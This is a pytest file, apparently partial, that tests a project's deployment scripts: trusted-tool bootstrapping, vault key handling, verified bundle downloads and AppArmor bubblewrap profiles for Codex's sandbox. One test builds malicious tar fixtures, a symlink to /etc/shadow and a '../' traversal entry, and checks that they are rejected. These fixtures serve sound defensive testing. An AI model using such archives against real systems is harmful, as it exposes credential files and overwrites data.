    assert result.stdout.strip() == str(protected)


@pytest.mark.parametrize('installer', ['install.sh', 'setup.sh'])
def test_primary_uv_bootstrap_never_uses_an_owner_executable(tmp_path, installer):
    tools = tmp_path / 'tools'
    tools.mkdir()
    marker = tmp_path / 'executed-owner-tool'
    stub(tools, 'uv', f'touch "{marker}"; echo owner-tool')
    stub(tools, 'sh', 'exit 99')  # pinned installation boundary: never install onto this test host
    if os.getuid() == 0:  # as root, the stub would be root's and rightly trusted: make it another account's
        for path in (tools, tools / 'uv'):
            os.chown(path, 65534, 65534)
    text = (REPO / 'deploy' / installer).read_text()
    if installer == 'install.sh':
        fragment = text[text.index('echo "== python environment"'):text.index('/usr/bin/python3 -I -c')]
        fragment += '\nprintf "%s" "$UV"'
    else:
        fragment = text[text.index('log "uv (Python'):text.index('log "Claude Code')]
    # The old setup fallback must not find a pre-existing local binary before the owner tool.
    fragment = fragment.replace('/usr/local/bin/uv', str(tmp_path / 'missing-system-uv'))
    prefix = 'source "$REPO/deploy/lib/trusted-tool.sh"; TRUSTED_TOOL_UID=0; log() { :; }; info() { :; }; '
    result = run(['bash', '-eu', '-c', prefix + fragment], REPO=str(REPO), UV=str(tools / 'uv'),
                 OWNER_HOME=str(tmp_path), PATH=f"{tools}:{os.environ['PATH']}")
    assert result.returncode in (0, 99), result.stderr
    assert str(tools / 'uv') not in result.stdout.splitlines()
    assert not marker.exists()


def test_installer_key_step_requires_matching_key_for_postgresql(tmp_path):
    tools = tmp_path / 'tools'
    tools.mkdir()
    stub(tools, 'runuser', 'test "$1 $2 $3" = "-u acc --" || exit 90; shift 3; exec "$@"')
    data = tmp_path / 'data'
    (data / 'secrets').mkdir(parents=True)
    script = (REPO / 'deploy/install.sh').read_text()
    block = script[script.index('/usr/bin/python3 -I "$REPO/deploy/lib/data-paths.py" check'):
                   script.index('install -d -o acc -g acc -m 0755 /srv/acc/catalog')]
    block = block.replace('/srv/acc/data', str(data)).replace('"$(id -u acc)"', str(os.getuid()))
    options = {'PATH': f"{tools}:{os.environ['PATH']}", 'REPO': str(REPO),
               'DATABASE_URL': 'postgresql+psycopg://unused/example'}
    result = run(['bash', '-eu', '-c', block], **options)
    key = data / 'secrets/vault.key'
    assert result.returncode == 1
    assert 'external database' in result.stderr
    assert not key.exists()
    key.write_text('preserved-key')
    result = run(['bash', '-eu', '-c', block], **options)
    assert result.returncode == 0, result.stderr
    assert key.read_text() == 'preserved-key'

@pytest.mark.parametrize('trust', ['system', 'ca'])
def test_windows_source_uses_primary_bundle(primary, stubs, tmp_path, trust):
    primary.routes['/api/nodes/bundle'] = build(REPO, tmp_path / 'bundle', version=__version__).read_bytes()
    ca = tmp_path / 'system-ca.pem'
    ca.write_bytes(pem(primary.ca))
    dest = tmp_path / 'downloaded'
    result = run(['sh', str(REPO / 'deploy/node/windows/source.sh'), str(dest), primary.url, trust,
                  fingerprint_of(primary.ca) if trust == 'ca' else '-'], CURL_CA_BUNDLE=str(ca))
    assert result.returncode == 0, result.stdout + result.stderr
    assert (dest / 'deploy/node/install.sh').is_file()
    assert (dest / '.acc-build').read_text().strip()
    assert primary.hits == (['/api/nodes/ca'] if trust == 'ca' else []) + ['/api/nodes/bundle']

@pytest.mark.parametrize('archive', [b'bad gzip', tar_bytes([('acc-0.13.0/link', 'link', '/etc/shadow')]),
    tar_bytes([('acc-0.13.0/../evil', 'file', b'x')])], ids=['not-gzip', 'link', 'dot-dot'])
def test_windows_source_rejects_unsafe_bundle_without_fallback(primary, tmp_path, archive):
    primary.routes['/api/nodes/bundle'] = archive
    ca = tmp_path / 'ca.pem'
    ca.write_bytes(pem(primary.ca))
    result = run(['sh', str(REPO / 'deploy/node/windows/source.sh'), str(tmp_path / 'dest'), primary.url,
                  'system', ''], CURL_CA_BUNDLE=str(ca))
    assert result.returncode == 1
    assert not (tmp_path / 'dest').exists()


def test_windows_source_network_failure_allows_explicit_fallback(stubs, tmp_path):
    stub(stubs, 'curl', 'exit 7')
    result = run(['sh', str(REPO / 'deploy/node/windows/source.sh'), str(tmp_path / 'dest'),
                  'https://acc.example.lan', 'system', ''], PATH=f"{stubs}:{os.environ['PATH']}")
    assert result.returncode == 10
    assert 'main Rynhult cannot be reached' in result.stderr
    assert not (tmp_path / 'dest').exists()


def test_windows_source_bad_ca_never_allows_fallback(primary, tmp_path):
    result = run(['sh', str(REPO / 'deploy/node/windows/source.sh'), str(tmp_path / 'dest'),
                  primary.url, 'ca', '0' * 64])
    assert result.returncode == 1 and 'fingerprint mismatch' in result.stderr
    assert primary.hits == ['/api/nodes/ca']


@pytest.mark.parametrize('name', ['rynhult-node', 'acc-node'])
def test_enrollment_parser_accepts_public_and_legacy_command(name):
    result = parse(f'{name} enroll --primary https://acc.example.lan --trust system --code {CODE} --name demo')
    assert result.returncode == 0, result.stderr
    assert result.stdout == f'https://acc.example.lan|system||{CODE}|demo'


# ------------------------------------------------------------------- AppArmor user namespaces and Codex's sandbox --

USERNS_LIB = REPO / "deploy/lib/apparmor-userns.sh"


def profile_rules(path: Path) -> list[str]:
    return [line.strip() for line in path.read_text().splitlines() if line.strip() and not line.lstrip().startswith("#")]


def test_the_system_bwrap_profile_allows_user_namespaces_for_usr_bin_bwrap_only():
    """acc-host, 2026-10-25: Codex 0.163 runs the distribution's /usr/bin/bwrap once the package is there (it came with
    libwebkit2gtk-4.1-dev), which acc-codex-bwrap doesn't cover. Same shape: one path, userns, a local include."""
    assert profile_rules(REPO / "deploy/apparmor/acc-system-bwrap") == [
        "abi <abi/4.0>,", "include <tunables/global>",
        "profile acc-system-bwrap /usr/bin/bwrap flags=(unconfined) {", "userns,",
        "include if exists <local/acc-system-bwrap>", "}"]
    codex = profile_rules(REPO / "deploy/apparmor/acc-codex-bwrap")
    assert codex[2].startswith("profile acc-codex-bwrap /usr/lib/node_modules/@openai/codex/") and codex[3] == "userns,"


def userns_install(tmp_path, restricted: str, existing: dict | None = None):
    """deploy/install.sh's AppArmor block, against a temporary /etc/apparmor.d, a stub parser and a given sysctl."""
    text = (REPO / "deploy/install.sh").read_text()
    fragment = text[text.index('source "$REPO/deploy/lib/apparmor-userns.sh"'):text.index('check_codex_sandbox "$AGENT_USER"')]
    etc, security, tools = tmp_path / "apparmor.d", tmp_path / "security-apparmor", tmp_path / "tools"
    for folder in (etc, security, tools):
        folder.mkdir(parents=True)
    for name, content in (existing or {}).items():
        (etc / name).write_text(content)
    loaded = tmp_path / "loaded"
    stub(tools, "apparmor_parser", f'echo "$*" >> "{loaded}"')
    (tmp_path / "sysctl").write_text(restricted + "\n")
    fragment = fragment.replace("/etc/apparmor.d", str(etc)).replace("/sys/kernel/security/apparmor", str(security))
    result = run(["bash", "-eu", "-c", fragment], REPO=str(REPO), PATH=f"{tools}:{os.environ['PATH']}",
                 ACC_USERNS_SYSCTL=str(tmp_path / "sysctl"))
    assert result.returncode == 0, result.stderr
    return etc, loaded.read_text().split("\n") if loaded.exists() else []


def test_the_installer_adds_the_system_bwrap_profile_where_user_namespaces_are_restricted(tmp_path):
    etc, loaded = userns_install(tmp_path / "on", "1")
    assert sorted(p.name for p in etc.iterdir()) == ["acc-chrome", "acc-codex-bwrap", "acc-system-bwrap"]
    assert (etc / "acc-system-bwrap").read_bytes() == (REPO / "deploy/apparmor/acc-system-bwrap").read_bytes()
    assert f"-r {etc}/acc-system-bwrap" in loaded  # loaded even with no /usr/bin/bwrap: the package can come later
    etc, loaded = userns_install(tmp_path / "off", "0")
    assert sorted(p.name for p in etc.iterdir()) == ["acc-chrome", "acc-codex-bwrap"]
    assert not any("acc-system-bwrap" in line for line in loaded)


def test_an_installed_profile_that_says_the_same_is_kept_byte_identical(tmp_path):
    """The owner's acc-host profile already exists: equal apart from comments and whitespace means no rewrite."""
    repo = (REPO / "deploy/apparmor/acc-system-bwrap").read_text()
    same = "# the owner's own comment\n" + "\n".join("    " + line for line in repo.splitlines() if not line.startswith("#")) + "\n"
    other = repo.replace("userns,", "userns,\n  capability sys_admin,")
    etc, loaded = userns_install(tmp_path / "same", "1", {"acc-system-bwrap": same})
    assert (etc / "acc-system-bwrap").read_text() == same and f"-r {etc}/acc-system-bwrap" in loaded
    etc, _ = userns_install(tmp_path / "other", "1", {"acc-system-bwrap": other})
    assert (etc / "acc-system-bwrap").read_text() == repo


def codex_check(tmp_path, codex_body: str | None, system_bwrap: bool, bundled: bool = False):
    import pwd
    tools = tmp_path / "tools"
    tools.mkdir(parents=True)
    stub(tools, "runuser", 'shift 3; exec "$@"')  # -u <account> --
    stub(tools, "timeout", 'shift; exec "$@"')
    if codex_body is not None:
        stub(tools, "codex", codex_body)
    system = tmp_path / "usr-bin-bwrap"
    if system_bwrap:
        stub(tmp_path, "usr-bin-bwrap", "exit 0")
    vendor = tmp_path / "codex-linux-x64/vendor/x86_64/codex-resources"
    if bundled:
        vendor.mkdir(parents=True)
        stub(vendor, "bwrap", "exit 0")
    for name in ("cat", "cut", "env", "getent", "sed", "setsid", "sh", "tail", "tr"):  # nothing else, never the host's codex
        (tools / name).symlink_to(shutil.which(name))
    account = pwd.getpwuid(os.getuid()).pw_name
    path = str(tools)
    return run(["/bin/bash", "-c", 'source "$1"; check_codex_sandbox "$2"', "-", str(USERNS_LIB), account],
               PATH=path, ACC_AGENT_PATH=path, ACC_SYSTEM_BWRAP=str(system),
               ACC_CODEX_BWRAP_GLOB=str(tmp_path / "codex-linux-*/vendor/*/codex-resources/bwrap")), account, system, vendor


FAILING_CODEX = 'test "$*" = "sandbox -- /bin/true" || exit 9; echo "bwrap: loopback: Failed RTM_NEWADDR: Operation not permitted" >&2; exit 1'


def test_a_broken_codex_sandbox_is_a_warning_naming_the_bwrap_it_used(tmp_path):
    result, account, system, _ = codex_check(tmp_path / "system", FAILING_CODEX, system_bwrap=True)
    assert result.returncode == 0  # never fails the install
    assert result.stderr.startswith(f"WARNING: Codex's sandbox doesn't work for {account}: "
                                    "'codex sandbox -- /bin/true' failed (bwrap: loopback: Failed RTM_NEWADDR")
    assert f"Codex used {system} (the distribution's bubblewrap; profile acc-system-bwrap)." in result.stderr
    result, _, _, vendor = codex_check(tmp_path / "bundled", FAILING_CODEX, system_bwrap=False, bundled=True)
    assert f"Codex used {vendor}/bwrap (Codex's bundled bubblewrap; profile acc-codex-bwrap)." in result.stderr
    result, _, _, _ = codex_check(tmp_path / "none", FAILING_CODEX, system_bwrap=False)
    assert "Codex used no bubblewrap found" in result.stderr


def test_a_working_or_missing_codex_passes_quietly(tmp_path):
    result, account, _, _ = codex_check(tmp_path / "works", 'test "$*" = "sandbox -- /bin/true"', system_bwrap=True)
    assert result.returncode == 0 and result.stdout.strip() == f"Codex sandbox: works for {account}"
    assert result.stderr == ""
    result, _, _, _ = codex_check(tmp_path / "absent", None, system_bwrap=True)
    assert result.returncode == 0 and result.stdout == "" and result.stderr == ""
